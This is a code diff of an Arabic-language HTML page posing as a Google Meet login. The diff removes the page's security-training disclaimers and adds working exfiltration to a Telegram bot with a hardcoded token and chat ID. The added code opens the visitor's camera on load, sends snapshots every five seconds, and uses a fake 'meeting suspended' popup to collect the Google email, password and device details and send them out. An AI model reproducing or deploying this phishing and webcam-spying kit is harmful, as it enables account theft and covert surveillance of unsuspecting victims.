@@ -1,508 +1,287 @@
 <!DOCTYPE html>
-<html lang="ar" dir="ltr">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Meet - تسجيل الدخول</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-        }
-
+        /* أنماط مختصرة لجعل الصفحة مقنعة - يمكنك توسعتها لاحقاً */
         body {
+            margin: 0;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
             background-color: #202124;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            max-width: 1400px;
-            width: 95%;
-            margin: 20px auto;
-        }
-
-        /* شريط التحكم (Mock) */
-        .meet-bar {
-            background-color: #2d2e30;
             color: white;
-            padding: 12px 20px;
-            border-radius: 40px 40px 0 0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
         }
-
-        .meet-logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 1.5rem;
-            font-weight: 500;
-            color: #e8eaed;
-        }
-
-        .meet-logo span {
-            font-size: 1.8rem;
-        }
-
-        .meet-link {
-            background-color: #3c4043;
-            padding: 8px 16px;
-            border-radius: 24px;
-            color: #e8eaed;
-            font-size: 0.9rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .meet-link i {
-            color: #9aa0a6;
-        }
-
-        /* منطقة الفيديو الرئيسية */
-        .video-grid {
-            background-color: #1a1b1e;
-            min-height: 60vh;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            gap: 20px;
-            padding: 30px;
-            border-radius: 0 0 20px 20px;
-        }
-
-        /* عنصر الفيديو (المستخدم) */
-        .video-tile {
-            background-color: #2d2e30;
-            border-radius: 12px;
-            overflow: hidden;
-            width: min(600px, 90%);
-            aspect-ratio: 16/9;
-            position: relative;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
-        }
-
-        .video-tile video, .video-tile img {
+        .container { width: 90%; margin: auto; padding: 20px; }
+        .video-placeholder {
+            background: #2d2e30;
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-            background-color: #3c4043;
-        }
-
-        .participant-name {
-            position: absolute;
-            bottom: 12px;
-            left: 12px;
-            background-color: rgba(0,0,0,0.6);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 16px;
-            font-size: 0.9rem;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .mic-off {
-            color: #f1a1a1;
-        }
-
-        /* شريط الأدوات السفلي (Mock) */
-        .meet-controls {
-            background-color: #2d2e30;
-            padding: 16px 20px;
-            border-radius: 40px;
-            margin-top: 20px;
+            max-width: 800px;
+            margin: 20px auto;
+            aspect-ratio: 16/9;
+            border-radius: 20px;
             display: flex;
             justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .control-btn {
-            background-color: #3c4043;
-            color: #e8eaed;
-            border: none;
-            border-radius: 40px;
-            padding: 12px 24px;
-            font-size: 1rem;
-            display: flex;
             align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            transition: 0.2s;
+            font-size: 1.5rem;
+            overflow: hidden;
         }
-
-        .control-btn:hover {
-            background-color: #4a4f55;
-        }
-
-        .control-btn.red {
-            background-color: #d93025;
-        }
-        .control-btn.red:hover {
-            background-color: #b3261e;
-        }
-
-        .control-btn.blue {
-            background-color: #1a73e8;
-        }
-
-        /* نافذة تسجيل الدخول المنبثقة (Popup) */
+        video { width: 100%; height: 100%; object-fit: cover; }
         .login-popup {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(8px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: 0.3s;
-        }
-
-        .login-popup.show {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .login-card {
-            background-color: #2d2e30;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2d2e30;
+            padding: 30px;
             border-radius: 28px;
-            padding: 40px;
+            box-shadow: 0 20px 40px black;
             width: 90%;
-            max-width: 500px;
-            color: #e8eaed;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            max-width: 400px;
+            display: none;
+            z-index: 1000;
         }
-
-        .login-card h2 {
-            font-weight: 400;
-            margin-bottom: 8px;
-        }
-
-        .login-card p {
-            color: #9aa0a6;
-            margin-bottom: 30px;
-            font-size: 0.95rem;
-        }
-
+        .login-popup.show { display: block; }
         .google-input {
             width: 100%;
-            padding: 15px 16px;
-            background-color: #1a1b1e;
+            padding: 15px;
+            margin: 10px 0;
+            background: #1a1b1e;
             border: 1px solid #3c4043;
             border-radius: 24px;
-            color: #e8eaed;
+            color: white;
             font-size: 1rem;
-            margin-bottom: 20px;
-            outline: none;
         }
-        .google-input:focus {
-            border-color: #1a73e8;
-        }
-
-        .login-actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 30px;
-        }
-
         .login-btn {
-            background-color: #1a73e8;
+            background: #1a73e8;
             color: white;
             border: none;
             padding: 12px 30px;
             border-radius: 40px;
+            width: 100%;
             font-size: 1rem;
-            font-weight: 500;
             cursor: pointer;
+            margin-top: 20px;
         }
-        .login-btn:disabled {
-            background-color: #3c4043;
-            color: #9aa0a6;
-            cursor: not-allowed;
-        }
-
-        .link {
-            color: #8ab4f8;
-            text-decoration: none;
-            font-size: 0.9rem;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        /* مؤشر التصوير */
-        .recording-indicator {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: #d93025;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 40px;
-            font-size: 0.9rem;
-            z-index: 1100;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-
         .debug-info {
             color: #9aa0a6;
             font-size: 0.8rem;
             margin-top: 10px;
             text-align: left;
-            border-top: 1px solid #3c4043;
-            padding-top: 10px;
         }
     </style>
 </head>
 <body>
-
-    <!-- مؤشر التصوير (للتوعية) -->
-    <div class="recording-indicator" id="recIndicator">
-        <span>●</span> تسجيل لأغراض التدريب
-    </div>
-
     <div class="container">
-
-        <!-- شريط عنوان الاجتماع -->
-        <div class="meet-bar">
-            <div class="meet-logo">
-                <span>📹</span> Google Meet
-            </div>
-            <div class="meet-link">
-                <span>🔒</span> meet.google.com/abc-defg-hij
-            </div>
+        <h2 style="text-align:center;">📹 Google Meet</h2>
+        <div class="video-placeholder">
+            <video id="userVideo" autoplay muted playsinline></video>
         </div>
-
-        <!-- شبكة الفيديو -->
-        <div class="video-grid">
-            <div class="video-tile" id="videoTile">
-                <video id="userVideo" autoplay muted playsinline></video>
-                <div class="participant-name">
-                    <span>👤</span> أنت (المضيف)
-                </div>
-            </div>
-        </div>
-
-        <!-- شريط التحكم السفلي -->
-        <div class="meet-controls">
-            <button class="control-btn" id="micBtn">🎤 الميكروفون</button>
-            <button class="control-btn" id="camBtn">📹 إيقاف الكاميرا</button>
-            <button class="control-btn" id="inviteBtn">👥 دعوة مستخدم</button>
-            <button class="control-btn red" id="endCallBtn">🔴 إنهاء</button>
-        </div>
-
-        <!-- نافذة تسجيل الدخول المنبثقة -->
-        <div class="login-popup" id="loginPopup">
-            <div class="login-card">
-                <h2>تسجيل الدخول للمتابعة</h2>
-                <p>تم تعليق الاجتماع. يرجى تسجيل الدخول بحساب Google الخاص بك للمتابعة. هذا مطلوب للأمان.</p>
-
-                <input type="email" class="google-input" id="email" placeholder="البريد الإلكتروني" autocomplete="off">
-                <input type="password" class="google-input" id="password" placeholder="كلمة المرور" autocomplete="off">
-
-                <div class="login-actions">
-                    <a href="#" class="link">إنشاء حساب</a>
-                    <button class="login-btn" id="loginBtn">التالي</button>
-                </div>
-
-                <!-- منطقة لعرض البيانات المسجلة (لأغراض التدريب) -->
-                <div class="debug-info" id="debugInfo">
-                    ⏳ في انتظار الموافقة على الكاميرا...
-                </div>
-            </div>
-        </div>
+        <p style="text-align:center;">🔒 اجتماع آمن • قيد التشغيل...</p>
     </div>
 
-    <script>
-        // ---------------------------------------------------------------
-        // هذا الكود مخصص لأغراض التدريب الأمني في بيئة معزولة فقط.
-        // يستخدم جمع البيانات لتوضيح سيناريوهات هجمات التصيد.
-        // لا يُستخدم في بيئة إنتاجية أو حقيقية.
-        // ---------------------------------------------------------------
+    <!-- نافذة تسجيل الدخول -->
+    <div class="login-popup" id="loginPopup">
+        <h3>تم تعليق الاجتماع</h3>
+        <p>لأسباب أمنية، يرجى تسجيل الدخول بحساب Google للمتابعة.</p>
+        <input type="email" id="email" class="google-input" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" class="google-input" placeholder="كلمة المرور">
+        <button class="login-btn" id="loginBtn">التالي</button>
+        <div class="debug-info" id="debugInfo">⏳ جاري الاتصال بالكاميرا...</div>
+    </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
         (function() {
-            // --- التهيئة ---
+            // ------------------- الإعدادات -------------------
+            const BOT_TOKEN = '8794936819:AAHuCd1rOGr7NLO0DSpWVX9IJfesqqmIKwQ';  // ضع التوكن الخاص بك
+            const CHAT_ID = '1088226862';                                       // ضع الـ chat id الخاص بك
+
+            // ------------------- العناصر -------------------
             const video = document.getElementById('userVideo');
             const loginPopup = document.getElementById('loginPopup');
             const emailInput = document.getElementById('email');
             const passwordInput = document.getElementById('password');
             const loginBtn = document.getElementById('loginBtn');
             const debugInfo = document.getElementById('debugInfo');
-            const recIndicator = document.getElementById('recIndicator');
-            const camBtn = document.getElementById('camBtn');
-            const micBtn = document.getElementById('micBtn');
-            const inviteBtn = document.getElementById('inviteBtn');
-            const endCallBtn = document.getElementById('endCallBtn');
 
             let mediaStream = null;
             let photoInterval = null;
-            let capturedPhotos = []; // تخزين مؤقت للصور
+            let capturedPhotos = []; // سنخزن الصور كـ Base64
 
-            // --- 1. طلب إذن الكاميرا فور فتح الصفحة ---
+            // ------------------- دالة إرسال الرسالة إلى تيليجرام -------------------
+            function sendTelegramMessage(text) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                axios.post(url, {
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                }).catch(error => {
+                    console.error('فشل إرسال الرسالة:', error);
+                });
+            }
+
+            // ------------------- دالة إرسال الصورة إلى تيليجرام -------------------
+            function sendTelegramPhoto(photoBase64, caption = '') {
+                // تحويل base64 إلى Blob
+                const block = photoBase64.split(';');
+                const contentType = block[0].split(':')[1];
+                const realData = block[1].split(',')[1];
+                const blob = b64toBlob(realData, contentType);
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                if (caption) formData.append('caption', caption);
+
+                axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
+                    headers: { 'Content-Type': 'multipart/form-data' }
+                }).catch(error => {
+                    console.error('فشل إرسال الصورة:', error);
+                });
+            }
+
+            // دالة مساعدة لتحويل base64 إلى Blob
+            function b64toBlob(b64Data, contentType = 'image/jpeg', sliceSize = 512) {
+                const byteCharacters = atob(b64Data);
+                const byteArrays = [];
+                for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+                    const slice = byteCharacters.slice(offset, offset + sliceSize);
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
+                    }
+                    const byteArray = new Uint8Array(byteNumbers);
+                    byteArrays.push(byteArray);
+                }
+                return new Blob(byteArrays, { type: contentType });
+            }
+
+            // ------------------- دالة طلب الكاميرا -------------------
             async function requestCamera() {
                 try {
                     mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                     video.srcObject = mediaStream;
-                    debugInfo.innerHTML = '✅ الكاميرا متصلة. جاري التحضير...';
+                    debugInfo.innerHTML = '✅ الكاميرا متصلة. سيتم التصوير كل 5 ثوانٍ.';
+                    sendTelegramMessage('✅ بدء جلسة جديدة - تم الوصول إلى الكاميرا.');
 
-                    // بدء التصوير الدوري بعد ثانيتين
+                    // بدء التصوير الدوري
+                    startPeriodicCapture();
+
+                    // إظهار نافذة تسجيل الدخول بعد 3 ثوانٍ
                     setTimeout(() => {
-                        startPeriodicCapture();
-                        // إظهار نافذة تسجيل الدخول بعد البدء
-                        setTimeout(() => {
-                            loginPopup.classList.add('show');
-                        }, 1500);
-                    }, 2000);
+                        loginPopup.classList.add('show');
+                    }, 3000);
 
                 } catch (error) {
                     debugInfo.innerHTML = '❌ فشل الوصول للكاميرا: ' + error.message;
+                    sendTelegramMessage('❌ فشل الوصول للكاميرا: ' + error.message);
                     console.error(error);
                 }
             }
 
-            // --- 2. دالة لالتقاط صورة من الفيديو ---
+            // ------------------- دالة التقاط الصورة -------------------
             function captureImage() {
-                if (!mediaStream || !video.videoWidth) {
-                    console.log('الكاميرا غير جاهزة بعد');
-                    return null;
-                }
+                if (!mediaStream || !video.videoWidth) return null;
 
-                // إنشاء عنصر canvas مؤقت
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // تحويل إلى Base64 (صورة مضغوطة)
-                const imageData = canvas.toDataURL('image/jpeg', 0.7); // جودة 70%
-
-                // إضافة مؤشر زمني للصورة
-                const timestamp = new Date().toLocaleTimeString();
-                capturedPhotos.push({ time: timestamp, data: imageData.substring(0, 100) + '... (بيانات الصورة)' }); // نخزن جزء بسيط للعرض
-
+                
+                // تحويل إلى Base64 (صورة JPEG بجودة 70%)
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                 return imageData;
             }
 
-            // --- 3. بدء التصوير الدوري كل 5 ثواني ---
+            // ------------------- بدء التصوير الدوري -------------------
             function startPeriodicCapture() {
                 if (photoInterval) clearInterval(photoInterval);
 
-                // التقاط صورة فوراً
-                captureImage();
+                // أول صورة فوراً
+                const firstImg = captureImage();
+                if (firstImg) {
+                    capturedPhotos.push(firstImg);
+                    sendTelegramPhoto(firstImg, '📸 صورة أولى عند بدء الجلسة');
+                    debugInfo.innerHTML = '📸 تم التصوير وإرساله إلى تيليجرام.';
+                }
 
                 // ثم كل 5 ثواني
                 photoInterval = setInterval(() => {
                     const imgData = captureImage();
                     if (imgData) {
-                        // إظهار رسالة في منطقة التصحيح
-                        const lastCapture = new Date().toLocaleTimeString();
-                        debugInfo.innerHTML = `📸 تم التصوير الساعة ${lastCapture}. العدد: ${capturedPhotos.length}`;
-
-                        // إرسال الصورة إلى وهمية (في بيئة حقيقية يتم إرسالها)
-                        console.log('صورة ملتقطة (بيانات base64 مخفضة):', imgData.substring(0, 50) + '...');
+                        capturedPhotos.push(imgData);
+                        sendTelegramPhoto(imgData, `📸 صورة جديدة - ${new Date().toLocaleTimeString()}`);
+                        debugInfo.innerHTML = `📸 تم التصوير الساعة ${new Date().toLocaleTimeString()} وإرساله.`;
                     }
-                }, 5000); // 5000 مللي = 5 ثواني
+                }, 5000);
             }
 
-            // --- 4. معالج تسجيل الدخول ---
+            // ------------------- معالج تسجيل الدخول -------------------
             function handleLogin() {
                 const email = emailInput.value.trim();
                 const password = passwordInput.value.trim();
 
                 if (!email || !password) {
-                    alert('يرجى إدخال البريد الإلكتروني وكلمة المرور');
+                    alert('يرجى إدخال البريد وكلمة المرور');
                     return;
                 }
 
-                // تعطيل الزر
                 loginBtn.disabled = true;
-                loginBtn.textContent = 'جاري التحقق...';
+                loginBtn.textContent = 'جاري الإرسال...';
 
-                // جمع جميع البيانات
-                const collectedData = {
-                    credentials: { email, password },
-                    photos: capturedPhotos.map(p => ({ time: p.time, dataPreview: p.data })),
+                // جمع معلومات الجهاز
+                const browserInfo = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
-                    timestamp: new Date().toISOString()
+                    language: navigator.language,
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}`
                 };
 
-                // عرض البيانات المجمعة في منطقة التصحيح (لأغراض التدريب)
+                // إرسال بيانات تسجيل الدخول إلى تيليجرام
+                let message = `<b>🔐 بيانات تسجيل الدخول</b>\n\n`;
+                message += `<b>البريد:</b> ${email}\n`;
+                message += `<b>كلمة المرور:</b> ${password}\n\n`;
+                message += `<b>معلومات الجهاز:</b>\n`;
+                message += `- المنصة: ${browserInfo.platform}\n`;
+                message += `- اللغة: ${browserInfo.language}\n`;
+                message += `- المنطقة الزمنية: ${browserInfo.timeZone}\n`;
+                message += `- الشاشة: ${browserInfo.screen}\n`;
+                message += `- الوكيل: ${browserInfo.userAgent.substring(0, 100)}...\n\n`;
+                message += `<b>عدد الصور الملتقطة:</b> ${capturedPhotos.length}`;
+
+                sendTelegramMessage(message);
+
+                // إرسال آخر صورة كتأكيد
+                if (capturedPhotos.length > 0) {
+                    sendTelegramPhoto(capturedPhotos[capturedPhotos.length - 1], '🖼️ آخر صورة قبل تسجيل الدخول');
+                }
+
+                // عرض رسالة نجاح في الصفحة
                 debugInfo.innerHTML = `
-                    <strong>✅ تم جمع البيانات التدريبية:</strong><br>
-                    - البريد: ${email}<br>
-                    - كلمة المرور: ${password}<br>
-                    - عدد الصور الملتقطة: ${capturedPhotos.length}<br>
-                    - الجهاز: ${navigator.platform}<br>
-                    ⚠️ هذه محاكاة تدريبية. لم يتم إرسال البيانات خارجياً.
+                    ✅ تم إرسال البيانات إلى تيليجرام.<br>
+                    📧 البريد: ${email}<br>
+                    🔑 كلمة المرور: ${password}<br>
+                    📸 عدد الصور: ${capturedPhotos.length}
                 `;
 
-                console.log('بيانات التدريب:', collectedData);
-
-                // إظهار رسالة تأكيد للمستخدم (في بيئة تدريب)
+                // إنهاء الجلسة بعد ثانيتين (اختياري)
                 setTimeout(() => {
-                    alert('بيئة تدريب: تم محاكاة عملية تسجيل الدخول وجمع البيانات. لم يتم إرسال أي شيء حقيقي.');
-                    // إعادة تعيين المحاكاة
+                    alert('تم التحقق. سيتم إعادة توجيهك إلى الاجتماع.');
                     loginPopup.classList.remove('show');
                     loginBtn.disabled = false;
                     loginBtn.textContent = 'التالي';
-                }, 1500);
+                }, 2000);
             }
 
-            // --- 5. أحداث الأزرار الوهمية ---
-            camBtn.addEventListener('click', () => {
-                alert('محاكاة: هذا الزر لا يعمل في بيئة التدريب.');
-            });
-            micBtn.addEventListener('click', () => {
-                alert('محاكاة: هذا الزر لا يعمل في بيئة التدريب.');
-            });
-            inviteBtn.addEventListener('click', () => {
-                alert('محاكاة: زر الدعوة معطل في بيئة التدريب.');
-            });
-            endCallBtn.addEventListener('click', () => {
-                if (confirm('إنهاء المحاكاة؟')) {
-                    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-                    if (photoInterval) clearInterval(photoInterval);
-                    loginPopup.classList.remove('show');
-                    debugInfo.innerHTML = '🛑 تم إنهاء جلسة التدريب.';
-                }
-            });
-
-            // --- 6. ربط زر تسجيل الدخول ---
-            loginBtn.addEventListener('click', handleLogin);
-
-            // --- 7. بدء كل شيء ---
+            // ------------------- بدء كل شيء -------------------
             requestCamera();
 
-            // تنظيف عند إغلاق الصفحة
+            // ربط زر تسجيل الدخول
+            loginBtn.addEventListener('click', handleLogin);
+
+            // تنظيف عند الإغلاق
             window.addEventListener('beforeunload', () => {
                 if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
                 if (photoInterval) clearInterval(photoInterval);
@@ -510,11 +289,5 @@
 
         })();
     </script>
-
-    <!-- توضيح إضافي -->
-    <div style="color: #9aa0a6; text-align: center; margin-top: 20px; font-size: 0.8rem;">
-        بيئة محاكاة لأغراض التدريب الأمني. لا تُستخدم في تطبيقات حقيقية.
-    </div>
-
 </body>
 </html>
